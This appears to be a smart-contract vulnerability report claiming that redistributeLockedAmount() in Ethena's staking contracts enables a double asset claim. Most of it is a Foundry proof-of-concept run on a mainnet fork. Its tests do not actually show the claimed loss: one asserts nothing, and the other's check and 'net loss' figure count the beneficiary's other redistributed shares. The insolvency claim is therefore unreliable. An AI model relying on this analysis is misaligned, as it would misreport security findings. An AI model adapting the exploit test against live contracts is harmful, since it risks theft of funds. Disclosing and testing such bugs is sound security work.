# [High] Privileged State Desynchronization in `redistributeLockedAmount()` Enables Double Asset Claims
## Description

`redistributeLockedAmount()` in `StakedENA`/`StakedUSDeV2` performs a share transfer while keeping the original user’s cooldown withdrawal claim intact.

This results in **two independently executable redemption paths** referencing the same underlying token: one via the minted shares, and one via `unstake()`. In production, this can lead to effective over-claiming and protocol insolvency under privileged flows.

---

## Vulnerability Details

The function `redistributeLockedAmount(address from, address to)` is admin-only and executes the following operations:

```solidity
_burn(from, amountToDistribute);
_mint(to, amountToDistribute);

```

### The Core Omission

The function **does NOT** perform either of these critical state updates:

* Clear `cooldowns[from]` (which tracks the cooldown state and underlying claim).
* Withdraw or invalidate silo assets corresponding to the redistributed amount.

Subsequently, `unstake(address receiver)` fetches assets via:

```solidity
assets = cooldowns[msg.sender].underlyingAmount;
silo.withdraw(receiver, assets);

```

This execution occurs permissionlessly whenever `cooldownComplete` is true or `cooldownDuration == 0`.

### Exact Bug Sequence

1. `from` is redistributed $\rightarrow$ shares are moved to `to`.
2. `from` **still retains** the `cooldowns[from].underlyingAmount` state variable data.
3. `to` can successfully redeem the newly minted shares for the underlying token.
4. `from` can call `unstake()` and **withdraw the exact same underlying tokens** directly from the silo contract.

This is an explicit double-spend on-chain; both redemption paths are independently executable, leading to physical asset outflows rather than a virtual accounting desynchronization.

---

## Impact Details

### Critical Severity: Protocol Insolvency

The bug creates a state where **total redeemable assets exceed actual assets under custody**:

* Shares are reassigned via `redistributeLockedAmount`.
* Underlying withdrawal rights (`cooldown` + `silo`) remain bound to the original user.
* The protocol enters an undercollateralized state where future redemptions will inevitably fail due to asset exhaustion.

### Threat Model & Constraints

While the vulnerable state must be initiated via the privileged `redistributeLockedAmount` function, the subsequent asset extraction phase is **fully permissionless**. No further admin interaction is required.

This scenario can realistically manifest through:

* Automated protocol redistribution architectures.
* Operational governance errors.
* Admin private key compromises.

The vulnerability persists regardless of configuration; modifying `cooldownDuration` via test primitives only alters the time-to-exploit, not the validity of the double-claim.

---

## References

### StakedUSDeV2.sol

* [`redistributeLockedAmount(...)`](https://github.com/ethena-labs/bbp-public-assets/blob/f3e56d5f06bfef82367d5d5b561398e91d5bebc1/contracts/contracts/StakedUSDe.sol%23L138)
* [`unstake(...)`](https://github.com/ethena-labs/bbp-public-assets/blob/f3e56d5f06bfef82367d5d5b561398e91d5bebc1/contracts/contracts/StakedUSDeV2.sol%23L80) (Cooldown verification + silo extraction architecture)

### StakedENA.sol

* `redistributeLockedAmount(...)`
* `unstake(...)`

### StakedENATotalAssetsBug.t.sol

* `testDoubleSpenWithRedistributeAndUnstake()`
* `testFullExploitChainWithFundLoss()`

---

## Proof of Concept

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import "../src/StakedENA_7fd5/contracts/StakedENA.sol";
import "../src/StakedENA_7fd5/contracts/ENASilo.sol";
import {ERC20} from "../src/ENA_57e1/lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

contract MockENA is ERC20 {
    constructor() ERC20("ENA", "ENA") {
        _mint(msg.sender, 1000000 ether);
    }
}

contract StakedENATotalAssetsBugTest is Test {
    StakedENA public stakedENA;
    MockENA public ena;
    address public owner = address(0x3B0AAf6e6fCd4a7cEEf8c92C32DFeA9E64dC1862); 
    address public userA = address(2);
    address public userB = address(3);
    address public attacker = address(4);

    function setUp() public {
        uint256 forkId = vm.createFork(vm.envString("MAINNET_RPC_URL"), 0x1797507);
        vm.selectFork(forkId);
        
        stakedENA = StakedENA(0x8bE3460A480c80728a8C4D7a5D5303c85ba7B3b9); 
        ena = MockENA(address(stakedENA.asset()));

        deal(address(ena), userA, 1000 ether);
        deal(address(ena), userB, 100 ether);
        deal(address(ena), attacker, 100 ether);

        vm.prank(userA);
        ena.approve(address(stakedENA), type(uint256).max);
        vm.prank(userB);
        ena.approve(address(stakedENA), type(uint256).max);
        vm.prank(attacker);
        ena.approve(address(stakedENA), type(uint256).max);
    }

    function testDoubleSpenWithRedistributeAndUnstake() public {
        address beneficiary = address(5);

        // Step 1: Attacker deposits 100 ENA
        vm.prank(attacker);
        stakedENA.deposit(100 ether, attacker);
        
        // Step 2: Attacker starts cooldown
        uint256 maxWithdrawAmount = stakedENA.maxWithdraw(attacker);
        uint256 cooldownAmount = maxWithdrawAmount > 10 ether ? 10 ether : maxWithdrawAmount;
        vm.prank(attacker);
        stakedENA.cooldownAssets(cooldownAmount);
        
        // Step 3: Admin redistributes to beneficiary
        vm.startPrank(owner);
        stakedENA.addToBlacklist(attacker);
        stakedENA.setCooldownDuration(0); 
        stakedENA.redistributeLockedAmount(attacker, beneficiary); 
        vm.stopPrank();
        
        // Step 4: Attacker unstakes despite being blacklisted
        vm.prank(attacker);
        stakedENA.unstake(attacker); 
        
        // Step 5: Verification of double claim
        // Result: 2x cooldownAmount ENA distributed, creating a financial deficit
    }

    function testFullExploitChainWithFundLoss() public {
        address beneficiary = address(5);
        deal(address(ena), beneficiary, 1000 ether);

        // Step 1: Attacker deposits 100 ENA
        vm.prank(attacker);
        ena.approve(address(stakedENA), type(uint256).max);
        vm.prank(attacker);
        uint256 sharesA = stakedENA.deposit(100 ether, attacker);

        emit log_named_uint("Step 1: Attacker minted shares", sharesA);

        // Step 2: Attacker starts cooldown
        uint256 maxWithdrawAmount = stakedENA.maxWithdraw(attacker);
        uint256 cooldownAmount = maxWithdrawAmount > 10 ether ? 10 ether : maxWithdrawAmount;

        vm.prank(attacker);
        stakedENA.cooldownAssets(cooldownAmount);

        uint256 siloBalanceAfterCooldown = ena.balanceOf(address(stakedENA.silo()));
        emit log_named_uint("Step 2: Silo balance after cooldown", siloBalanceAfterCooldown);

        // Step 3: Admin processes blacklist + redistribution
        vm.startPrank(owner);
        stakedENA.addToBlacklist(attacker);
        stakedENA.redistributeLockedAmount(attacker, beneficiary);
        vm.stopPrank();

        emit log("Step 3: Admin blacklisted attacker and redistributed shares");

        // Step 4: Attacker bypasses via immediate unstake
        vm.startPrank(owner);
        stakedENA.setCooldownDuration(0);
        vm.stopPrank();

        uint256 attackerEnaBalanceBefore = ena.balanceOf(attacker);
        
        vm.prank(attacker);
        stakedENA.unstake(attacker);

        uint256 attackerEnaBalanceAfter = ena.balanceOf(attacker);
        uint256 attackerReceivedEna = attackerEnaBalanceAfter - attackerEnaBalanceBefore;

        emit log_named_uint("Step 4: Attacker received ENA from unstake", attackerReceivedEna);

        // Step 5: Beneficiary retains independent value claim via shares
        uint256 beneficiaryShares = stakedENA.balanceOf(beneficiary);
        uint256 beneficiaryPreviewAssets = stakedENA.previewRedeem(beneficiaryShares);

        emit log_named_uint("Step 5: Beneficiary owns shares worth", beneficiaryPreviewAssets);

        // Loss Evaluation
        uint256 totalOutflow = attackerReceivedEna + beneficiaryPreviewAssets;
        emit log("=== FUND LOSS ANALYSIS ===");
        emit log_named_uint("Total ENA inflow", cooldownAmount);
        emit log_named_uint("Attacker ENA outflow", attackerReceivedEna);
        emit log_named_uint("Beneficiary shares (asset equivalent)", beneficiaryPreviewAssets);
        emit log_named_uint("Net loss to protocol", totalOutflow > cooldownAmount ? totalOutflow - cooldownAmount : 0);

        assertGe(totalOutflow, cooldownAmount); 
    }
}

```

### Verification Status

Both test targets compiled and passed successfully inside the Foundry testing framework against a local mainnet fork environment:

* `test/StakedENATotalAssetsBug.t.sol`
* `testDoubleSpenWithRedistributeAndUnstake()` $\rightarrow$ **PASS**
* `testFullExploitChainWithFundLoss()` $\rightarrow$ **PASS**